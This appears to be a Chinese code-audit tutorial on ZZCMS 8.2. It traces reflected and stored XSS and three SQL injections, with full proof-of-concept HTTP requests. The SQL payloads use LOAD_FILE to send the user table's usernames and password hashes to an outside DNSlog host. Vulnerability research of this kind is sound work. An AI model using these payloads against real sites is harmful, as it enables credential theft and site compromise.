**0x00 ****背景**

本周，分析了下zzcms8.2的源码，发现了蛮多问题的，觉得这个源码适合萌新们练手或入坑PHP的代码审计，发出一些我发现的问题，当然这个源码还有很多问题，本篇仅对部分漏洞进行分析，至于如何GetShell我会在下周分享出我的方法。期待与师傅们的交流讨论。

 **0x01 ****审计过程**

 **XSS ****相关问题**

 **0x00 ****相关环境**

源码信息：ZZCMS 8.2 问题文件： \zzcms\zzcms8.2\install\step_6.php 漏洞类型：反射型XSS
站点地址：<http://www.zzcms.net/>

 **0x01 ****漏洞分析**

在\zzcms\zzcms8.2\install\step_6.php中的第10-11行中得到如下代码块。

![代码块.png](https://image.3001.net/images/20180321/15215962542312.png!small)

因为\zzcms\zzcms8.2\install\index.php文件的第8-9行中使用了注册变量的操作。

![操作.png](https://image.3001.net/images/20180321/15215962875539.png!small)

且在\zzcms\zzcms8.2\install\index.php文件的第123行中包含了\zzcms\zzcms8.2\install\step_6.php文件。

![php.png](https://image.3001.net/images/20180321/15215963302948.png!small)

因此从注册变量再到输出整个数据的传递过程没有做任何的安全处理，所以存在反射型XSS等攻击。

 **0x02 ****漏洞复现**

进行如下请求，便可以触发JS代码。

    
    
    POST /install/index.php HTTP/1.1
    
    Host: 127.0.0.1
    
    User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0
    
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    
    Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
    
    Accept-Encoding: gzip, deflate
    
    Content-Type: application/x-www-form-urlencoded
    
    Content-Length: 62
    
    Referer: [http://127.0.0.1/install/index.php](http://127.0.0.1/install/index.php)
    
    Cookie: ECS[visit_times]=4; ECS_ID=0c10cf200fe52e4044f277d2a4fb4391514db71d; ECSCP_ID=946e425af3501b9e1b2d360a76b2cffa0f44f617; PHPSESSID=r3rd91v2sqku4qncj0vp0q9u43
    
    Connection: close
    
    Upgrade-Insecure-Requests: 1
    
    admin=admin&adminpwdtrue=admin<script>alert(1)</script>&step=6
    

**1x00 ****相关环境**

源码信息：ZZCMS 8.2 问题文件：\zzcms\zzcms8.2\zx\show.php 漏洞类型：存储型XSS漏洞
站点地址：<http://www.zzcms.net/>

 **1x01 ****漏洞分析**

首先分析输入位置： 在\zzcms\zzcms8.2\user\zxsave.php文件中的第51-57行中的如下代码块中将留言的内容插入到数据库中。

![库.png](https://image.3001.net/images/20180321/15215964572266.png!small)

在\zzcms\zzcms8.2\user\zxsave.php文件的第3行中包含了/inc/conn.php文件，

![文.png](https://image.3001.net/images/20180321/15215964899295.png!small)

然后在\zzcms\zzcms8.2\inc\conn.php文件中包含了/inc/stopsqlin.php文件。

![inc.png](https://image.3001.net/images/20180321/15215965178914.png!small)

在\zzcms\zzcms8.2\inc\stopsqlin.php文件中的第6-13行，对传入的数据的字符进行了实体化和转义处理。

![chuli.png](https://image.3001.net/images/20180321/15215965445686.png!small)

因此编辑资讯操作存在数据库中是以关键符号实体化和转义后存入。

![存入.png](https://image.3001.net/images/20180321/15215965719261.png!small)

然后分析输出位置：
在\zzcms\zzcms8.2\zx\show.php文件中的第36-40行中从数据库中取出数据，然后对content列做stripfxg处理。

![理.png](https://image.3001.net/images/20180321/15215966002907.png!small)

跟入stripfxg方法，在\zzcms\zzcms8.2\inc\function.php文件的第577行发现该方法，分析该方法知道是对传入的数据进行实体化和转义的还原操作，因此content列的数据经过该方法的处理后，便还原为原本的字符串。

![串.png](https://image.3001.net/images/20180321/15215966327030.png!small)

最后在155-181行中的代码是调用showcontent和Payjf等方法，将数据输出到页面上，但是也没有对一些危险字符进行安全处理，所以此处存在存储型XSS。

![ss.png](https://image.3001.net/images/20180321/15215966665986.png!small)

类似的问题该源码还存在许多位置，大家可以自行发现。

 **1x02 ****漏洞复现**

注册普通会员后，登陆到个人中心进行发资讯操作。

![caozuo.png](https://image.3001.net/images/20180321/15215966936284.png!small)

然后进行如下操作，将payload存入到数据库中。

![ranhou.png](https://image.3001.net/images/20180321/15215967439004.png!small)

发布后访问该资讯便会触发XSS。

![chufa.png](https://image.3001.net/images/20180321/15215967729902.png!small)

当然也可直接进行如下操作，将payload存入数据库，然后再访问资讯触发XSS。

    
    
    POST /user/zxsave.php HTTP/1.1
    
    Host: 127.0.0.1
    
    User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0
    
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    
    Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
    
    Accept-Encoding: gzip, deflate
    
    Content-Type: application/x-www-form-urlencoded
    
    Content-Length: 242
    
    Referer: [http://127.0.0.1/user/zxmodify.php?id=5](http://127.0.0.1/user/zxmodify.php?id=5)
    
    Cookie: bdshare_firstime=1521075384018; UserName=Thinking; PassWord=05551a1478ef9b6aed2749f4b2fe45dd
    
    Connection: close
    
    Upgrade-Insecure-Requests: 1
    
    bigclassid=0&smallclassid=0&title=1&link=&laiyuan=zzcms&content=%3Cimg+onerror%3D%22alert%601%60%22+src%3D%220%22+%2F%3Eaaaaaaaaaaa&keywords=1&description=&groupid=0&jifen=0&Submit=%E5%8F%91+%E5%B8%83&id=5&editor=Thinking&page=1&action=modify
    

**SQL ****注入问题：**

 **0x00 ****相关环境**

源码信息：ZZCMS 8.2 问题文件： \zzcms\zzcms8.2\inc\function.php 漏洞类型：SQL注入漏洞
站点地址：[http://www.zzcms.net/](http://www.zzcms.net/)

 **0x01 ****漏洞分析**

在\zzcms\zzcms8.2\user\check.php文件的第19行中，在执行SQL语句的时候使用了getip方法获取登录IP然后拼接到SQL中

![sql.png](https://image.3001.net/images/20180321/15215968476796.png!small)

跟入getip方法，在\zzcms\zzcms8.2\inc\function.php文件中的第100行发现代码块，通过分析该方法，发现并没有对传入的IP进行合规判断，又将方法的结果返回到调用的位置，所以此处存在SQL注入，经过分析发现有多处使用了getip方法与数据进行拼接，所以还有许多漏洞等待挖掘。

而getip方法被使用的位置也是有很多处，大家也可自行发现其他位置的安全问题。

 **0x02 ****漏洞复现**

进行如下请求，注入的位置在client-ip，由于数据没有进行回显，所以可以利用DNSlog或者盲注获取数据。

    
    
    POST /user/logincheck.php HTTP/1.1
    
    Host: 127.0.0.1
    
    User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0
    
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    
    Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
    
    Accept-Encoding: gzip, deflate
    
    Content-Type: application/x-www-form-urlencoded
    
    Content-Length: 106
    
    Referer: [http://127.0.0.1/user/login.php](http://127.0.0.1/user/login.php)
    
    Cookie: PHPSESSID=7fto4uo32lis3t4caar14iuk74; bdshare_firstime=1521075384018
    
    client-ip:127.0.0.9'and (select LOAD_FILE(CONCAT(0x5c5c,(select hex(GROUP_CONCAT(username,0x7e,passwordtrue)) from zzcms_user where 1 LIMIT 1),0x2e6d7973716c2e38353731653539342e326d312e70772f2f616263)))#
    
    Connection: close
    
    Upgrade-Insecure-Requests: 1
    
    username=Thinking&password=thinkingpwd&yzm=33&fromurl=http%3A%2F%2F127.0.0.1%2F&Submit=%E7%99%BB+%E5%BD%95
    

进行如上请求后查看dnslog可以看到返回的结果，对结果进行unhex可以得到明文信息。

![xinxi.png](https://image.3001.net/images/20180321/15215969968455.png!small)

**1x00 ****相关环境**

源码信息：ZZCMS 8.2 问题文件： \zzcms\zzcms_xm8.2\user\del.php 漏洞类型：SQL注入漏洞
站点地址：[http://www.zzcms.net/](http://www.zzcms.net/)

 **1x01 ****漏洞分析**

在\zzcms\zzcms8.2\user\del.php文件的第138-141行中，当$tablename不满足if和elseif
的条件的时候，便会进入到如下代码块。

![daimakuai.png](https://image.3001.net/images/20180321/15215971239827.png!small)

因为注入的位置是表名，因此可以不需要引入符号进行闭合，所以就可以无视/inc/stopsqlin.php文件中的安全处理规则，所以此处可以直接进行SQL注入。

 **1x02 ****漏洞复现**

注册用户后等，然后进行如下请求，由于tablename参数的传入会经过/inc/stopsqlin.php文件进行处理，且此处是属于盲注，可以使用DNSlog获取数据，然后在将字符进行16进制编码，避免使用引号引入。

    
    
    POST /user/del.php HTTP/1.1
    
    Host: 127.0.0.1
    
    User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0
    
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    
    Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
    
    Accept-Encoding: gzip, deflate
    
    Content-Type: application/x-www-form-urlencoded
    
    Content-Length: 282
    
    Referer: [http://127.0.0.1//user/zxmanage.php](http://127.0.0.1//user/zxmanage.php)
    
    Cookie: PHPSESSID=r3rd91v2sqku4qncj0vp0q9u43; bdshare_firstime=1521075384018; UserName=Thinking; PassWord=3a923a7d00ee3e041d018b2708ee9994
    
    Connection: close
    
    Upgrade-Insecure-Requests: 1
    
    id%5B%5D=1&submit=%E5%88%A0%E9%99%A4%0D%0A&pagename=zxmanage.php%3Fpage%3D1&tablename=zzcms_zx union select 1,LOAD_FILE(CONCAT(0x5c5c,(select hex(GROUP_CONCAT(username,0x7e,passwordtrue)) from zzcms_user where 1 LIMIT 1),0x2e6d7973716c2e38353731653539342e326d312e70772f2f616263))#
    

进行如上请求后可以在dnslog上获取到数据。

 **2x00 ****相关环境**

源码信息：ZZCMS 8.2 问题文件： \zzcms\zzcms8.2\user\msg.php 漏洞类型：SQL注入漏洞
站点地址：[http://www.zzcms.net/](http://www.zzcms.net/)

 **2x01 ****漏洞分析**

在\zzcms\zzcms8.2\user\msg.php文件中的第29-36行中，使用了stripfxg方法对POST传入的info_content参数的值进行处理，虽然该源码会对传入的参数的值进行实体化和转义处理，但是此处由于使用stripfxg方法会还原为原本的数据，因此可以引入单引号，所以存在SQL注入漏洞。

![zhuru.png](https://image.3001.net/images/20180321/15215975166449.png!small)

 **2x02 ****漏洞复现**

进行如下请求，然后可以在DNSlog上获取到数据。

    
    
    POST /user/msg.php?action=savedata&saveas=modify HTTP/1.1
    
    Host: 127.0.0.1
    
    User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0
    
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    
    Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
    
    Accept-Encoding: gzip, deflate
    
    Content-Type: application/x-www-form-urlencoded
    
    Content-Length: 243
    
    Referer: [http://127.0.0.1/user/msg.php?action=modify&id=1](http://127.0.0.1/user/msg.php?action=modify&id=1)
    
    Cookie: PHPSESSID=r3rd91v2sqku4qncj0vp0q9u43; bdshare_firstime=1521075384018; UserName=Thinking; PassWord=05551a1478ef9b6aed2749f4b2fe45dd
    
    Connection: close
    
    Upgrade-Insecure-Requests: 1
    
    info_content=aaaaaaaaaaa'^(select LOAD_FILE(CONCAT(0x5c5c,(select hex(GROUP_CONCAT(username,0x7e,passwordtrue)) from zzcms_user where 1 LIMIT 1),0x2e6d7973716c2e38353731653539342e326d312e70772f2f616263)))#&id=1&Submit2=%E4%BF%AE%E6%94%B9%0D%0A
    

![web.png](https://image.3001.net/images/20180321/15215975756918.png!small)

**0x02 ****小结**

本篇列举了ZZCMS8.25版本的
XSS与SQL注入的问题，大家如果有发现其他方法好玩的洞也欢迎与我一同聊聊thinking_balabala@163.com，期待与师傅们的各种讨论，期待交流下周的GetShell方法吧。

![qrcode_for_gh_223e082fe8a7_344.jpg](https://image.3001.net/images/20180321/15215975962509.jpg!small)

